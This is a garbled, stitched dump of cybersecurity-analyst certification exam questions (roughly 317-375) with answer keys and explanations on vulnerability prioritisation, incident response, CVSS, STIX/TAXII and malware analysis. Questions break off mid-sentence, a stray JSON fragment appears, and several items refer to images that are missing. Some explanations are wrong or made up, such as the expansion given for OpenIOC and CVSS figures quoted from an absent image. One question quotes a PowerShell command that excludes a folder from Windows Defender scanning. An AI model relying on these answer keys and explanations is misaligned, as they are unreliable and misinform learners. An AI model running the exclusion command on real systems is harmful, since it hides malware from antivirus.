\n  \nAnswer: D  \n  \n  \nQUESTION 317  \nAn analyst is evaluating a vulnerability management dashboard. The analyst sees that a \npreviously remediated vulnerability has reappeared on a database server. Which of the following \nis the most likely cause?  \n  \nA. The finding is a false positive and should be ignored.  \nB. A rollback had been executed on the instance.  \nC. The vulnerability scanner was configured without credentials.  \nD. The vulnerability management software needs to be updated.  \n  \nAnswer: B Explanation:  \nA rollback had been executed on the instance. If a database server is restored to a previous \nstate, it may reintroduce a vulnerability that was previously fixed. This can happen due to backup \nand recovery operations, configuration changes, or software updates. A rollback can undo the \npatching or mitigation actions that were applied to remediate the vulnerability.  \n  \n  \nQUESTION 318  \nA company has decided to expose several systems to the internet. The systems are currently \navailable internally only. A security analyst is using a subset of CVSS3.1 exploitability metrics to \nprioritize the vulnerabilities that would be the most exploitable when the systems are exposed to \nthe internet. The systems and the vulnerabilities are shown below:  \n  \n\n\n \n  \n  \nWhich of the following systems should be prioritized for patching?  \n  \nA. brown  \nB. grey  \nC. blane  \nD. sullivan  \n  \nAnswer: C Explanation:  \nThe system \"blane\" with the vulnerability name \"snakedoctor\" should be prioritized for patching \nas it has a network attack vector (AV:N), low attack complexity (AC:L), and high availability (A:H). \nThese metrics indicate that it would be relatively easy to exploit this vulnerability over the internet, \nand the system is highly available. Reference: According to the CVSS v3.1 Specification \nDocument, the exploitability metrics for CVSS are Attack Vector, Attack Complexity, Privileges \nRequired, User Interaction, and Scope. These metrics measure how the vulnerability is \naccessed, the complexity of the attack, and the level of interaction and privileges required to \nexploit the vulnerability. The image shows a table with the values of these metrics for each \nsystem and vulnerability. Based on these values, the system \"blane\" has the highest exploitability \nscore, as it has the most favorable conditions for an attacker. The other systems have either a \nlower attack vector, higher attack complexity, or lower availability, which make them less \nexploitable. Therefore, the system \"blane\" should be patched first.  \n  \n  \nQUESTION 319  \nDuring an incident in which a user machine was compromised, an analyst recovered a binary file \nthat potentially caused the exploitation. Which of the following techniques could be used for \nfurther analysis?  \n  \nA. Fuzzing  \nB. Static analysis  \nC. Sandboxing  \nD.

Rendering an additional executive report  \nD. Regularly checking agent communication with the central console  \n  \nAnswer: D  \n  \n  \nQUESTION 321  \nThe Chief Information Security Officer (CISO) of a large management firm has selected a \ncybersecurity framework that will help the organization demonstrate its investment in tools and \nsystems to protect its data. Which of the following did the CISO most likely select?  \n  \nA. PCI DSS  \nB. COBIT  \nC. ISO 27001  \nD. ITIL  \n  \nAnswer: C Explanation:  \nISO 27001 is an international standard that establishes a framework for implementing, \nmaintaining, and improving an information security management system (ISMS). It helps \norganizations demonstrate their commitment to protecting their data and complying with various \nregulations and best practices. The other options are not relevant for this purpose: PCI DSS is a \nstandard that focuses on protecting payment card data; COBIT is a framework that provides \nguidance on governance and management of enterprise IT; ITIL is a framework that provides \nguidance on service management and delivery.  \n  \n  \nQUESTION 322  \nA high volume of failed RDP authentication attempts was logged on a critical server within a \nonehour period. All of the attempts originated from the same remote IP address and made use of \na single valid domain user account. Which of the following would be the most effective mitigating \ncontrol to reduce the rate of success of this brute-force attack?  \n  \nA. Enabling a user account lockout after a limited number of failed attempts  \nB. Installing a third-party remote access tool and disabling RDP on all devices  \nC. Implementing a firewall block for the remote system's IP address  \nD. Increasing the verbosity of log-on event auditing on all devices  \n  \nAnswer: A Explanation:  \nEnabling a user account lockout policy is a security measure that can effectively mitigate \nbruteforce attacks. After a predetermined number of consecutive failed login attempts, the \naccount will be locked, preventing the attacker from continuing to try different password \ncombinations. This control directly addresses the issue of multiple failed attempts from the same \nIP address using a single user account, making it the most effective among the options provided.  \n  \n  \nQUESTION 323  \nAn incident response analyst is investigating the root cause of a recent malware outbreak.

Take photos of the impacted items.  \n  \nAnswer: D  \n  \n  \nQUESTION 327  \nA cybersecurity analyst is participating with the DLP project team to classify the organization's \ndata. Which of the following is the primary purpose for classifying data?  \n  \nA. To identify regulatory compliance requirements  \nB. To facilitate the creation of DLP rules  \nC. To prioritize IT expenses  \nD. To establish the value of data to the organization  \n  \nAnswer: D  \nExplanation:  \nThe primary purpose of data classification is to determine the value of data to the organization. \nThis helps in defining protection levels, access controls, and risk mitigation strategies.  \n  \n  \nQUESTION 328  \nA security analyst observed the following activity from a privileged account:  \n  \n- Accessing emails and sensitive information  \n- Audit logs being modified  \n- Abnormal log-in times  \n  \nWhich of the following best describes the observed activity?  \n  \nA. Irregular peer-to-peer communication  \nB. Unauthorized privileges  \nC. Rogue devices on the network  \nD. Insider attack  \n\n\n \n  \nAnswer: D Explanation:  \nThe observed activity from a privileged account indicates an insider attack, which is when a \ntrusted user or employee misuses their access rights to compromise the security of the \norganization. Accessing emails and sensitive information, modifying audit logs, and logging in at \nabnormal times are all signs of malicious behavior by a privileged user who may be trying to \nsteal, tamper, or destroy data, or cover their tracks. An insider attack can cause significant \ndamage to the organization's reputation, operations, and compliance.  \n  \n  \nQUESTION 329  \nA vulnerability management team found four major vulnerabilities during an assessment and \nneeds to provide a report for the proper prioritization for further mitigation. Which of the following \nvulnerabilities should have the highest priority for the mitigation process?  \n  \nA. A vulnerability that has related threats and IoCs, targeting a different industry  \nB. A vulnerability that is related to a specific adversary campaign, with IoCs found in the SIEM  \nC. A vulnerability that has no adversaries using it or associated IoCs  \nD. A vulnerability that is related to an isolated system, with no IoCs  \n  \nAnswer: B Explanation:  \nA vulnerability that is related to a specific adversary campaign, with IoCs found in the SIEM, \nshould have the highest priority for the mitigation process. This is because it indicates that the \nvulnerability is actively being exploited by a known threat actor, and that the organization's \nsecurity monitoring system has detected signs of compromise. This poses a high risk of data \nbreach, service disruption, or other adverse impacts.  \n  \n  \nQUESTION 330  \nA security analyst received an alert regarding multiple successful MFA log-ins for a particular \nuser. When reviewing the authentication logs, the analyst sees the following:  \n  \n  \n  \nWhich of the following are most likely occurring, base on the MFA logs? (Choose two.)  \n  \nA. Dictionary attack  \nB. Push phishing  \nC. Impossible geo-velocity  \nD. Subscriber identity module swapping  \nE. Rogue access point  \nF. Password spray  \n\n\n \n  \nAnswer: BC \nExplanation:  \nImpossible geo-velocity: This is an event where a single user's account is accessed from different \ngeographical locations within a timeframe that is impossible for normal human travel. In the log, \nwe can see that the user \"jdoe\" is accessing from the United States and then within a few \nminutes from Russia, which is practically impossible to achieve without the use of some form of \nautomated system or if the account credentials are being used by different individuals in different \nlocations.  \nPush phishing: This could also be an indication of push phishing, where the user is tricked into \napproving a multi-factor authentication request that they did not initiate. This is less clear from the \nlogs directly, but it could be inferred if the user is receiving MFA requests that they are not \ninitiating and are being approved without their genuine desire to access the resources.  \n  \n  \nQUESTION 331  \nA security analyst has identified a new malware file that has impacted the organization. The \nmalware is polymorphic and has built-in conditional triggers that require a connection to the \ninternet. The CPU has an idle process of at least 70%. Which of the following best describes how \nthe security analyst can effectively review the malware without compromising the organization's \nnetwork?  \n  \nA. Utilize an RDP session on an unused workstation to evaluate the malware.  \nB. Disconnect and utilize an existing infected asset off the network.  \nC. Create a virtual host for testing on the security analyst workstation.  \nD. Subscribe to an online service to create a sandbox environment.  \n  \nAnswer: D Explanation:  \nA sandbox environment is a safe and isolated way to analyze malware without affecting the \norganization's network. An online service can provide a sandbox environment without requiring \nthe security analyst to set up a virtual host or use an RDP session. Disconnecting and using an \nexisting infected asset is risky and may not provide accurate results.  \n  \n  \nQUESTION 332  \nWhich of the following threat-modeling procedures is in the OWASP Web Security Testing Guide?  \n  \nA. Review of security requirements  \nB. Compliance checks  \nC. Decomposing the application  \nD. Security by design  \n  \nAnswer: C Explanation:  \nThe OWASP Web Security Testing Guide (WSTG) includes a section on threat modeling, which is \na structured approach to identify, quantify, and address the security risks associated with an \napplication. The first step in the threat modeling process is decomposing the application, which \ninvolves creating use cases, identifying entry points, assets, trust levels, and data flow diagrams \nfor the application. This helps to understand the application and how it interacts with external \nentities, as well as to identify potential threats and vulnerabilities.  \n  \n  \nQUESTION 333  \n\n\n \nWhich of the following would an organization use to develop a business continuity plan?  \n  \nA. A diagram of all systems and interdependent applications  \nB. A repository for all the software used by the organization  \nC. A prioritized list of critical systems defined by executive leadership  \nD. A configuration management database in print at an off-site location  \n  \nAnswer: C Explanation:  \nA prioritized list of critical systems defined by executive leadership is the best option to use to \ndevelop a business continuity plan. A business continuity plan (BCP) is a system of prevention \nand recovery from potential threats to a company. The plan ensures that personnel and assets \nare protected and are able to function quickly in the event of a disaster. A BCP should include a \nbusiness impact analysis, which identifies the critical systems and processes that are essential \nfor the continuity of the business operations, and the potential impacts of their disruption. The \nexecutive leadership should be involved in defining the critical systems and their priorities, as \nthey have the strategic vision and authority to make decisions that affect the whole organization. \nA diagram of all systems and interdependent applications, a repository for all the software used \nby the organization, and a configuration management database in print at an off-site location are \nall useful tools for documenting and managing the IT infrastructure, but they are not sufficient to \ndevelop a comprehensive BCP that covers all aspects of the business continuity.  \n  \n  \nQUESTION 334  \nThe management team requests monthly KPI reports on the company's cybersecurity program. \nWhich of the following KPIs would identify how long a security threat goes unnoticed in the \nenvironment?  \n  \nA. Employee turnover  \nB. Intrusion attempts  \nC. Mean time to detect  \nD. Level of preparedness  \n  \nAnswer: C Explanation:  \nMean time to detect (MTTD) is a metric that measures the average time it takes for an \norganization to discover or detect an incident. It is a key performance indicator in incident \nmanagement and a measure of incident response capabilities. A low MTTD indicates that the \norganization can quickly identify security threats and minimize their impact.   \n  \n  \nQUESTION 335  \nWhich of the following best describes the key elements of a successful information security \nprogram?  \n  \nA. Business impact analysis, asset and change management, and security communication plan  \nB. Security policy implementation, assignment of roles and responsibilities, and information asset \nclassification  \nC. Disaster recovery and business continuity planning, and the definition of access control \nrequirements and human resource policies  \nD. Senior management organizational structure, message distribution standards, and procedures \nfor the operation of security management systems  \n  \nAnswer: B Explanation:  \n\n\n \nA successful information security program consists of several key elements that align with the \norganization's goals and objectives, and address the risks and threats to its information assets. \nSecurity policy implementation: This is the process of developing, documenting, and enforcing \nthe rules and standards that govern the security of the organization's information assets. Security \npolicies define the scope, objectives, roles, and responsibilities of the security program, as well \nas the acceptable use, access control, incident response, and compliance requirements for the \ninformation assets.  \n  \n  \nQUESTION 336  \nA systems administrator notices unfamiliar directory names on a production server. The \nadministrator reviews the directory listings and files, and then concludes the server has been \ncompromised. Which of the following steps should the administrator take next?  \n  \nA. Inform the internal incident response team.  \nB. Follow the company's incident response plan.  \nC. Review the lessons learned for the best approach.  \nD. Determine when the access started.  \n  \nAnswer: B  \n  \n  \nQUESTION 337  \nWhich of the following is a nation-state actor least likely to be concerned with?  \n  \nA. Detection by MITRE ATT&CK framework.  \nB. Detection or prevention of reconnaissance activities.  \nC. Examination of its actions and objectives.  \nD. Forensic analysis for legal action of the actions taken.  \n  \nAnswer: D  \n  \n  \nQUESTION 338  \nWhich of the following is a commonly used four-component framework to communicate threat \nactor behavior?  \n  \nA. STRIDE  \nB. Diamond Model of Intrusion Analysis  \nC. Cyber Kill Chain  \nD. MITRE ATT&CK  \n  \nAnswer: B Explanation:  \nThe Diamond Model of Intrusion Analysis is a framework that describes the relationship between \nfour components of a cyberattack: adversary, capability, infrastructure, and victim. It helps \nanalysts understand the behavior and motivation of threat actors, as well as the tools and \nmethods they use to compromise their targets.  \n  \n  \nQUESTION 339  \n\n\n \nAn employee downloads a freeware program to change the desktop to the classic look of legacy \nWindows. Shortly after the employee installs the program, a high volume of random DNS queries \nbegin to originate from the system. An investigation on the system reveals the following:  \n  \nAdd-MpPreference - ExclusionPath '%Program Files%\\ksyconfig'   \nWhich of the following is possibly occurring?  \n  \nA. Persistence  \nB. Privilege escalation  \nC. Credential harvesting  \nD. Defense evasion  \n  \nAnswer: D  \nExplanation:  \nDefense evasion is the technique of avoiding detection or prevention by security tools or \nmechanisms. In this case, the freeware program is likely a malware that generates random DNS \nqueries to communicate with a command and control server or exfiltrate data. The command \nAdd- MpPreference -ExclusionPath '%Program Filest\\ksysconfig' is used to add an exclusion \npath to Windows Defender, which is a built-in antivirus software, to prevent it from scanning the \nmalware folder.  \n  \n  \nQUESTION 340  \nAn organization discovered a data breach that resulted in PII being released to the public. During \nthe lessons learned review, the panel identified discrepancies regarding who was responsible for \nexternal reporting, as well as the timing requirements. Which of the following actions would best \naddress the reporting issue?  \n  \nA. Creating a playbook denoting specific SLAs and containment actions per incident type  \nB. Researching federal laws, regulatory compliance requirements, and organizational policies to \ndocument specific reporting SLAs  \nC. Defining which security incidents require external notifications and incident reporting in \naddition to internal stakeholders  \nD. Designating specific roles and responsibilities within the security team and stakeholders to \nstreamline tasks  \n  \nAnswer: B Explanation:  \nResearching federal laws, regulatory compliance requirements, and organizational policies to \ndocument specific reporting SLAs is the best action to address the reporting issue. Reporting \nSLAs are service level agreements that specify the time frame and the format for notifying the \nrelevant authorities and the affected individuals of a data breach. Reporting SLAs may vary \ndepending on the type and severity of the breach, the type and location of the data, the industry \nand jurisdiction of the organization, and the internal policies of the organization. By researching \nand documenting the reporting SLAs for different scenarios, the organization can ensure that it \ncomplies with the legal and ethical obligations of data breach notification, and avoid any \npenalties, fines, or lawsuits that may result from failing to report a breach in a timely and \nappropriate manner.  \n  \n  \nQUESTION 341  \n\n\n \nDuring an incident, a security analyst discovers a large amount of PII has been emailed externally \nfrom an employee to a public email address.

Which of the following steps should be taken next?  \n  \nA. Isolation  \nB. Remediation C. Reimaging  \nD. Preservation  \n  \nAnswer: A Explanation:  \nIsolation is the first step to take after detecting some indicators of compromise (IoCs) of possible \nransomware contamination. Isolation prevents the ransomware from spreading to other servers \nor segments of the network, and allows the security team to investigate and contain the incident. \n\n\n \nIsolation can be done by disconnecting the infected servers from the network, blocking the \nmalicious traffic, or applying firewall rules.  \n  \n  \nQUESTION 347  \nAn MSSP received several alerts from customer 1, which caused a missed incident response \ndeadline for customer 2. Which of the following best describes the document that was violated?  \n  \nA. KPI  \nB. SLO  \nC. SLA  \nD. MOU  \n  \nAnswer: C Explanation:  \nAn SLA, or Service Level Agreement, is a contract between a service provider and its customers \nthat documents what services the provider will furnish and defines the service standards the \nprovider is obligated to meet. In the scenario described, the missed incident response deadline is \na clear indicator of an SLA violation. An SLA usually outlines the metrics by which service is \nmeasured as well as remedies or penalties should agreed-upon service levels not be achieved. \nUnlike a KPI (Key Performance Indicator) which is a quantifiable measure used to evaluate the \nsuccess of an organization, employee, etc., in meeting objectives for performance, or an MOU \n(Memorandum of Understanding) which is a formal agreement between two or more parties, an  \nSLA is focused on the performance and quality metrics applicable to the service provided. SLO \n(Service Level Objective) is related and often part of an SLA, representing the specific \nmeasurable characteristics of the SLA such as availability, throughput, frequency, response time, \nor quality.  \n  \n  \nQUESTION 348  \nWhich of the following is a reason proper handling and reporting of existing evidence are \nimportant for the investigation and reporting phases of an incident response?  \n  \nA. To ensure the report is legally acceptable in case it needs to be presented in court  \nB. To present a lessons-learned analysis for the incident response team  \nC. To ensure the evidence can be used in a postmortem analysis  \nD. To prevent the possible loss of a data source for further root cause analysis  \n  \nAnswer: A Explanation:  \nProper handling and reporting of existing evidence are important for the investigation and \nreporting phases of an incident response because they ensure the integrity, authenticity, and \nadmissibility of the evidence in case it needs to be presented in court. Evidence that is \nmishandled, tampered with, or poorly documented may not be accepted by the court or may be \nchallenged by the opposing party. Therefore, incident responders should follow the best practices \nand standards for evidence collection, preservation, analysis, and reporting.  \n  \n  \nQUESTION 349  \nAn attacker has just gained access to the syslog server on a LAN.

      "answer": "A",
      "explanation": "Cross-site scripting (XSS) attacks occur when an application includes untrusted data in a web \npage without proper validation or escaping. This allows attackers to execute malicious scripts in \nusers' browsers, leading to data theft, session hijacking, or defacement. Remediating input \nvalidation vulnerabilities is essential to prevent XSS attacks.  \n  \n  \nQUESTION 352  \nDuring a security test, a security analyst found a critical application with a buffer overflow \nvulnerability. Which of the following would be best to mitigate the vulnerability at the application \nlevel?  \n  \nA. Perform OS hardening.  \nB. Implement input validation.  \nC. Update third-party dependencies.  \nD. Configure address space layout randomization.  \n  \nAnswer: B Explanation:  \n\n\n \nImplementing input validation is the best way to mitigate the buffer overflow vulnerability at the \napplication level. Input validation is a technique that checks the data entered by users or \nattackers against a set of rules or constraints, such as data type, length, format, or range. Input \nvalidation can prevent common web application attacks such as SQL injection, cross-site \nscripting (XSS), or command injection, which exploit the lack of input validation to execute \nmalicious code or commands on the server or the client side. By validating the input before \nallowing submission, the web application can reject or sanitize any malicious or unexpected \ninput, and protect the application from being compromised.  \n  \n  \nQUESTION 353  \nThe SOC received a threat intelligence notification indicating that an employee's credentials were \nfound on the dark web. The user's web and log-in activities were reviewed for malicious or \nanomalous connections, data uploads/downloads, and exploits. A review of the controls \nconfirmed multifactor authentication was enabled. Which of the following should be done first to \nmitigate impact to the business networks and assets?  \n  \nA. Perform a forced password reset.  \nB. Communicate the compromised credentials to the user.  \nC. Perform an ad hoc AV scan on the user's laptop.  \nD. Review and ensure privileges assigned to the user's account reflect least privilege. E. Lower \nthe thresholds for SOC alerting of suspected malicious activity  \n  \nAnswer: A Explanation:  \nThe first and most urgent step to mitigate the impact of compromised credentials on the dark web \nis to perform a forced password reset for the affected user. This will prevent the cybercriminals \nfrom using the stolen credentials to access the company's network and systems. Multifactor \nauthentication is a good security measure, but it is not foolproof and can be bypassed by \nsophisticated attackers. Therefore, changing the password as soon as possible is the best \npractice to reduce the risk of a data breach or other cyber attack.  \n  \n  \nQUESTION 354  \nA security analyst is working on a server patch management policy that will allow the \ninfrastructure team to be informed more quickly about new patches. Which of the following would \nmost likely be required by the infrastructure team so that vulnerabilities can be remediated \nquickly? (Choose two.)  \n  \nA. Hostname  \nB. Missing KPI  \nC. CVE details  \nD. Baseline configuration  \nE. IoCs  \nF. npm identifier  \n  \nAnswer: CD \nExplanation:  \nCVE details provide specific information about known vulnerabilities, including severity and \nremediation guidance, enabling the infrastructure team to prioritize and apply patches effectively. \nBaseline configuration helps identify deviations due to missing patches or updates, allowing the \nteam to assess what needs to be remediated quickly.  \n  \n\n\n \n  \nQUESTION 355  \nChief Information Security Officer (CISO) wants to disable a functionality on a business-critical \nweb application that is vulnerable to RCE in order to maintain the minimum risk level with minimal \nincreased cost. Which of the following risk treatments best describes what the CISO is looking \nfor?  \n  \nA. Transfer  \nB. Mitigate  \nC. Accept  \nD. Avoid  \n  \nAnswer: B  \n  \n  \nQUESTION 356  \nA company has a primary control in place to restrict access to a sensitive database. However, the \ncompany discovered an authentication vulnerability that could bypass this control. Which of the \nfollowing is the best compensating control?  \n  \nA. Running regular penetration tests to identify and address new vulnerabilities.  \nB. Conducting regular security awareness training of employees to prevent social engineering \nattacks.  \nC. Deploying an additional layer of access controls to verify authorized individuals.  \nD. Implementing intrusion detection software to alert security teams of unauthorized access \nattempts  \n  \nAnswer: C Explanation:  \nDeploying an additional layer of access controls to verify authorized individuals is the best \ncompensating control for the authentication vulnerability that could bypass the primary control. A \ncompensating control is a security measure that is implemented to mitigate the risk of a \nvulnerability or a threat when the primary control is not sufficient or feasible. A compensating \ncontrol should provide a similar or greater level of protection as the primary control, and should \nbe closely related to the vulnerability or the threat it is addressing. In this case, the primary \ncontrol is to restrict access to a sensitive database, and the vulnerability is an authentication \nbypass. Therefore, the best compensating control is to deploy an additional layer of access \ncontrols, such as multifactor authentication, role-based access control, or encryption, to verify the \nidentity and the authorization of the individuals who are accessing the database. This way, the \ncompensating control can prevent unauthorized access to the database, even if the primary \ncontrol is bypassed. Running regular penetration tests, conducting regular security awareness \ntraining, and implementing intrusion detection software are all good security practices, but they \nare not compensating controls for the authentication vulnerability, as they do not provide a similar \nor greater level of protection as the primary control, and they are not closely related to the \nvulnerability or the threat they are addressing.  \n  \n  \nQUESTION 357  \nAn analyst discovers unusual outbound connections to an IP that was previously blocked at the \nweb proxy and firewall. Upon further investigation, it appears that the proxy and firewall rules that \nwere in place were removed by a service account that is not recognized. Which of the following \nparts of the Cyber Kill Chain does this describe?  \n  \n\n\n \nA. Delivery  \nB. Command and control  \nC. Reconnaissance  \nD. Weaponization  \n  \nAnswer: B Explanation:  \nThe Command and Control stage of the Cyber Kill Chain describes the communication between \nthe attacker and the compromised system. The attacker may use this channel to send \ncommands, receive data, or update malware. If the analyst discovers unusual outbound \nconnections to an IP that was previously blocked, it may indicate that the attacker has \nestablished a command and control channel and bypassed the security controls.  \n  \n  \nQUESTION 358  \nAn organization's email account was compromised by a bad actor.

The detection time is the time elapsed between the occurrence of an incident and its \ndiscovery by the security team . The other options are either too short or too long based on the \ngiven information.  \n  \n  \nQUESTION 359  \nA threat hunter seeks to identify new persistence mechanisms installed in an organization's \nenvironment. In collecting scheduled tasks from all enterprise workstations, the following host \ndetails are aggregated:  \n  \n  \n  \nWhich of the following actions should the hunter perform first based on the details above?  \n  \nA. Acquire a copy of taskhw.exe from the impacted host.  \nB. Scan the enterprise to identify other systems with taskhdw.exe present.  \nC. Perform a public search for malware reports on the taskhw.exe.  \nD. Change the account that runs the taskhw.exe scheduled task.  \n  \nAnswer: C Explanation:  \nThe first step should be to perform a public search for malware reports on taskhw.exe, as this file \nis suspicious for several reasons: it is located in a non-standard path, it has a high CPU usage, it \nis signed by an unknown entity, and it is only present on one host. A public search can help to \ndetermine if this file is a known malware or a legitimate program. If it is malware, the hunter can \nthen take appropriate actions to remove it and prevent further damage. The other options are \neither premature or ineffective, as they do not provide enough information to assess the threat \nlevel of taskhw.exe.  \n  \n  \nQUESTION 360  \nA SOC analyst is analyzing traffic on a network and notices an unauthorized scan.

Which of the following activities will provide the best \ninsight into this potentially malicious process, based on the anomalous behavior?  \n  \nA. Changes to system environment variables  \nB. SMB network traffic related to the system process  \nC. Recent browser history of the primary user  \nD. Activities taken by PID 1024  \n  \nAnswer: D Explanation:  \nThe activities taken by the process with PID 1024 will provide the best insight into this potentially \nmalicious process, based on the anomalous behavior. BGInfo.exe is a legitimate tool that \ndisplays system information on the desktop background, but it can also be used by attackers to \ngather information about the compromised host or to disguise malicious processes. By \nmonitoring the activities of PID 1024, such as the files it accesses, the network connections it \nmakes, or the commands it executes, the analyst can determine if the process is benign or \nmalicious.  \n  \n  \nQUESTION 367  \nWhich of the following evidence collection methods is most likely to be acceptable in court cases?  \n  \nA. Copying all access files at the time of the incident  \nB. Creating a file-level archive of all files  \nC. Providing a full system backup inventory  \nD. Providing a bit-level image of the hard drive  \n  \nAnswer: D Explanation:  \nA bit-level image is a forensic-grade copy that preserves all data on a disk, including unallocated \nspace, deleted files, and metadata. This is the most legally defensible form of digital evidence \ncollection, as it ensures that no potential evidence is missed.  \n  \n  \nQUESTION 368  \nA cybersecurity analyst has recovered a recently compromised server to its previous state. Which \nof the following should the analyst perform next?  \n  \nA. Eradication  \nB. Isolation  \nC. Reporting  \nD. Forensic analysis  \n  \nAnswer: D Explanation:  \nAfter recovering a compromised server to its previous state, the analyst should perform forensic \nanalysis to determine the root cause, impact, and scope of the incident, as well as to identify any \nindicators of compromise, evidence, or artifacts that can be used for further investigation or \nprosecution.  \n  \n  \nQUESTION 369  \n\n\n \nWhile performing a dynamic analysis of a malicious file, a security analyst notices the memory \naddress changes every time the process runs. Which of the following controls is most likely \npreventing the analyst from finding the proper memory address of the piece of malicious code?  \n  \nA. Address space layout randomization  \nB. Data execution prevention  \nC. Stack canary  \nD. Code obfuscation  \n  \nAnswer: A Explanation:  \nAddress space layout randomization (ASLR) is a security control that randomizes the memory \naddress space of a process, making it harder for an attacker to exploit memory-based \nvulnerabilities, such as buffer overflows. ASLR can also prevent a security analyst from finding \nthe proper memory address of a piece of malicious code, as the memory address changes every \ntime the process runs.  \n  \n  \nQUESTION 370  \nA company brings in a consultant to make improvements to its website. After the consultant \nleaves. a web developer notices unusual activity on the website and submits a suspicious file \ncontaining the following code to the security team:  \n  \n  \n  \nWhich of the following did the consultant do?  \n  \nA. Implanted a backdoor  \nB. Implemented privilege escalation  \nC. Implemented clickjacking  \nD. Patched the web server  \n  \nAnswer: A Explanation:  \nA backdoor is a method that allows an unauthorized user to access a system or network without \nthe permission or knowledge of the owner. A backdoor can be installed by exploiting a software \nvulnerability, by using malware, or by physically modifying the hardware or firmware of the \ndevice. A backdoor can be used for various malicious purposes, such as stealing data, installing \nmalware, executing commands, or taking control of the system.  \n  \n  \nQUESTION 371  \n\n\n \nWhich of the following makes STIX and OpenloC information readable by both humans and \nmachines?  \n  \nA. XML  \nB. URL  \nC. OVAL  \nD. TAXII  \n  \nAnswer: A Explanation:  \nSTIX and OpenloC are two standards for representing and exchanging cyber threat intelligence \n(CTI) information. STIX stands for Structured Threat Information Expression and OpenloC stands \nfor Open Location and Identity Coordinates. Both standards use XML as the underlying data \nformat to encode the information in a structured and machine-readable way. XML stands for \nExtensible Markup Language and it is a widely used standard for defining and exchanging data \non the web. XML uses tags, attributes, and elements to describe the structure and meaning of \nthe data. XML is also human- readable, as it uses plain text and follows a hierarchical and nested \nstructure. XML is not the only format that can be used to make STIX and OpenloC information \nreadable by both humans and machines, but it is the most common and widely supported one. \nOther formats that can be used include JSON, CSV, or PDF, depending on the use case and the \npreferences of the information producers and consumers.  \n  \n  \nQUESTION 372  \nAn analyst is evaluating the following vulnerability report:  \n  \n  \n  \nWhich of the following vulnerability report sections provides information about the level of impact \non data confidentiality if a successful exploitation occurs?  \n  \nA. Payloads  \nB. Metrics  \nC. Vulnerability  \n\n\n \nD. Profile  \n  \nAnswer: B Explanation:  \nThe Metrics section of the vulnerability report provides information about the level of impact on \ndata confidentiality if a successful exploitation occurs. The Metrics section contains the CVE \ndictionary entry and the CVSS base score of the vulnerability. CVE stands for Common \nVulnerabilities and Exposures and it is a standardized system for identifying and naming \nvulnerabilities. CVSS stands for Common Vulnerability Scoring System and it is a standardized \nsystem for measuring and rating the severity of vulnerabilities. The CVSS base score is a \nnumerical value between 0 and 10 that reflects the intrinsic characteristics of a vulnerability, such \nas its exploitability, impact, and scope. The CVSS base score is composed of three metric \ngroups: Base, Temporal, and Environmental. The Base metric group captures the characteristics \nof a vulnerability that are constant over time and across user environments. The Base metric \ngroup consists of six metrics: Attack Vector, Attack Complexity, Privileges Required, User \nInteraction, Scope, and Impact. The Impact metric measures the effect of a vulnerability on the \nconfidentiality, integrity, and availability of the affected resources. In this case, the CVSS base \nscore of the vulnerability is 9.8, which indicates a critical severity level. The Impact metric of the \nCVSS base score is 6.0, which indicates a high impact on confidentiality, integrity, and availability. \nTherefore, the Metrics section provides information about the level of impact on data \nconfidentiality if a successful exploitation occurs.  \n  \n  \nQUESTION 373  \nWhich of the following best describes the importance of implementing TAXII as part of a threat \nintelligence program?  \n  \nA. It provides a structured way to gain information about insider threats.  \nB. It proactively facilitates real-time information sharing between the public and private sectors. \nC. It exchanges messages in the most cost-effective way and requires little maintenance \nonce implemented.  \nD. It is a semi-automated solution to gather threat intellbgence about competitors in the same sector.  \n  \nAnswer: B Explanation:  \nTAXII, or Trusted Automated eXchange of Intelligence Information, is a standard protocol for \nsharing cyber threat intelligence in a standardized, automated, and secure manner. TAXII defines \nhow cyber threat information can be shared via services and message exchanges, such as \ndiscovery, collection management, inbox, and poll. TAXII is designed to support STIX, or \nStructured Threat Information eXpression, which is a standardized language for describing cyber \nthreat information in a readable and consistent format. Together, STIX and TAXII form a \nframework for sharing and using threat intelligence, creating an open-source platform that allows \nusers to search through records containing attack vectors details such as malicious IP \naddresses, malware signatures, and threat actors. The importance of implementing TAXII as part \nof a threat intelligence program is that it proactively facilitates real-time information sharing \nbetween the public and private sectors. By using TAXII, organizations can exchange cyber threat \ninformation with various entities, such as security vendors, government agencies, industry \nassociations, or trusted groups. TAXII enables different sharing models, such as hub and spoke, \nsource/subscriber, or peer-to-peer, depending on the needs and preferences of the information \nproducers and consumers. TAXII also supports different levels of access control, encryption, and \nauthentication to ensure the security and privacy of the shared information.  \n  \n  \nQUESTION 374  \n\n\n \nDuring a recent site survey. an analyst discovered a rogue wireless access point on the network. \nWhich of the following actions should be taken first to protect the network while preserving \nevidence?  \n  \nA. Run a packet sniffer to monitor traffic to and from the access point.  \nB. Connect to the access point and examine its log files.  \nC. Identify who is connected to the access point and attempt to find the attacker. D. Disconnect \nthe access point from the network  \n  \nAnswer: D Explanation:  \nA rogue access point is a wireless access point that has been installed on a network without the \nauthorization or knowledge of the network administrator. A rogue access point can pose a serious \nsecurity risk, as it can allow unauthorized users to access the network, intercept network traffic, \nor launch attacks against the network or its devices. The first action that should be taken to \nprotect the network while preserving evidence is to disconnect the rogue access point from the \nnetwork. This will prevent any further damage or compromise of the network by blocking the \naccess point from communicating with other devices or users. Disconnecting the rogue access \npoint will also preserve its state and configuration, which can be useful for forensic analysis and \ninvestigation. Disconnecting the rogue access point can be done physically by unplugging it from \nthe network port or wirelessly by disabling its radio frequency.  \n  \n  \nQUESTION 375  \nWhile a security analyst for an organization was reviewing logs from web servers. the analyst \nfound several successful attempts to downgrade HTTPS sessions to use cipher modes of \noperation susceptible to padding oracle attacks. Which of the following combinations of \nconfiguration changes should the organization make to remediate this issue? (Choose two.)  \n  \nA. Configure the server to prefer TLS 1.3.  \nB. Remove cipher suites that use CBC.  \nC. Configure the server to prefer ephemeral modes for key exchange.  \nD. Require client browsers to present a user certificate for mutual authentication.  \nE. Configure the server to require HSTS.  \nF. Remove cipher suites that use GCM.  \n  \nAnswer: AB \nExplanation:  \nA padding oracle attack is a type of attack that exploits the padding validation of a cryptographic \nmessage to decrypt the ciphertext without knowing the key. A padding oracle is a system that \nresponds to queries about whether a message has a valid padding or not, such as a web server \nthat returns different error messages for invalid padding or invalid MAC. A padding oracle attack \ncan be applied to the CBC mode of operation, where the attacker can manipulate the ciphertext \nblocks and use the oracle's responses to recover the plaintext. To remediate this issue, the \norganization should make the following configuration changes:  \nConfigure the server to prefer TLS 1.3. TLS 1.3 is the latest version of the Transport Layer \nSecurity protocol, which provides secure communication between clients and servers. TLS 1.3 \nhas several security improvements over previous versions, such as:  \nIt deprecates weak and obsolete 